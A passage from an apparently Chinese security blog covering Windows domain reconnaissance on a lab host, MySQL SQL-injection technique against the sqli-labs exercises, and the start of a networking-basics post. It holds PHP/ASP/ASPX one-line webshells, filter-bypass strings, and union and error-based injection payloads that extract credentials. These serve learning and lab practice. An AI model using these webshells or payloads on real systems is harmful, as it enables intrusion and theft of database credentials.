混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询当前登录域及登录用户信息</span></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org  <span class="comment">###当前登录域名</span></span><br><span class="line">登录域                       GOD   <span class="comment">#此处表示当前用户是域用户还是本地，，这里表示域用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断主域</span></span><br><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">通常有三种情况：</span><br><span class="line">存在域，但当前用户不是域用户----拒绝访问</span><br><span class="line">存在域，且是--<span class="literal">-xx</span>的当前时间是xxx</span><br><span class="line">当前网络环境是工作组----找不到域xx的域控制器</span><br></pre></td></tr></table></figure>

<h3 id="2-4探测域内存活主机"><a href="#2-4探测域内存活主机" class="headerlink" title="2.4探测域内存活主机"></a><strong>2.4探测域内存活主机</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>



<p>一句话木马：</p>
<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-MYSQL-SQL-BYPASS" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/22/MYSQL-SQL-BYPASS/"
    >MYSQL_SQL_BYPASS</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/22/MYSQL-SQL-BYPASS/" class="article-date">
  <time datetime="2020-04-22T14:26:06.000Z" itemprop="datePublished">2020-04-22</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>知其然，更要知其所以然！ </p>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
<p>我们经常用到的几个表</p>
<ol>
<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
</ol>
<p>SCHEMATA: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>user 表保存的用户密码 和host等等信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>

<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>

<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
<li><strong>过滤不严格。</strong></li>
<li><strong>数据库配置不当。</strong></li>
<li><strong>转义不当。</strong></li>
</ol>
<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<hr>
<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
<p>读取host与user</p>
<p><strong>通过以上信息还能大概判断下是不是站库分离之类的</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
<p>同时#被过滤，但 –+ 可以</p>
<p>order by 猜测 列数  —-爆出为3列</p>
<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>可以爆出所有表–emails,referers,uagents,users</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>

<p>可以爆出user表下的所有列—id,username,password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>

<p>爆字段—</p>
<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
<p>总结：group_concat()可以聚合起来，查看更方便</p>
<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>

<p>users表被拦截，可以用以下方法绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>Q1.floor()函数是什么？</p>
<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
<p>Q2.rand(0)是什么意思？</p>
<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>Q3.为什么会出现报错？</p>
<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>

<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>

<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<hr>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-计网基础" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/"
    >计网基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2020-04-17T12:24:27.000Z" itemprop="datePublished">2020-04-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
<p><strong>(物理层-数据链路层)-网络层-运输层-(会话层-表示层-应用层)</strong></p>
<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
<p><strong>网络接口层–网际层IP-运输层（TCP-UDP)–应用层</strong></p>
<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
<p><strong>计算机网络性能指标：</strong></p>
<p>带宽：单位时间内网络中的某信道所能通过的“最高数据率”，单位是bit/s  —-上限</p>
<p>吞吐量：单位时间内通过某个网络（或信道、接口）的<strong>实际的数据量</strong>                                                                                                                                                                                             </p>
<hr>
<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
<p><strong>• 上三层：message 消息</strong> </p>
<p><strong>• 传输层：segment 数据段</strong></p>
<p><strong>• 网络层：packet 包</strong></p>
<p><strong>• 链路层：frame 帧</strong></p>
<p><strong>• 物理层：bit     比特流</strong></p>
<p>互联网组成 按工作方式划分为以下的两部分： </p>
<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
<p>互联网的边缘部分–两种通信方式 </p>
<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
<hr>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
<table>
<thead>
<tr>
<th></th>
<th>网络数目</th>
<th>第一个可用的网络号</th>
<th>最后一个课用的网络号</th>
<th>最大的主机数</th>
</tr>
</thead>
<tbody><tr>
<td>A类</td>
<td>126 (2^7-1)</td>
